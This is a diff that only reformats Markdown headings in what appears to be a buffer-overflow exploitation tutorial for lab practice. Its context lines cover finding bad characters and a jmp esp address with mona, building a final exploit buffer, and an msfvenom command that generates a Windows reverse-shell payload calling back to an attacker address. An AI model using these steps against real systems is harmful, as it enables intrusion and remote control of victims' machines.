@@ -151,7 +151,7 @@ You can also use these web generator to find the offset:
 2. https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 
-### 3. Finding Bad Characters
+# 3. Finding Bad Characters
 
 Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.
 
@@ -194,7 +194,7 @@ Restart Immunity and run the exploit.py again. Then, use the mona compare comman
 Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
 
 
-### 4. Finding a Jump Point
+# 4. Finding a Jump Point
 Find a jump point (Search de addres to set on the exploit in the "retn" part).
 The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.
 
@@ -202,7 +202,7 @@ The following example searches for "jmp esp" or equivalent (e.g. call esp, push 
 !mona jmp -r esp -cpb "\x00\x0a\x0d" (change "\x00\x0a\x0d" value)
 ```
 
-### 5. Generate Shell Code
+# 5. Generate Shell Code
 
 Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:
 
@@ -215,9 +215,7 @@ or
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f python
 ```
 
-
-Prepend NOPs
-============
+### Prepend NOPs
 
 If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.
 
@@ -225,8 +223,7 @@ If an encoder was used (more than likely if bad chars are present, remember to p
 padding = "\x90" * 16
 ```
 
-Final Buffer
-============
+### Final Buffer
 
 ```
  prefix = ""
@@ -238,8 +235,8 @@ Final Buffer
  postfix = ""
     
  buffer = prefix + overflow + retn + padding + payload + postfix
+```
 
-
-# 1. Exploit it!
+# 6. Exploit it!
 
 
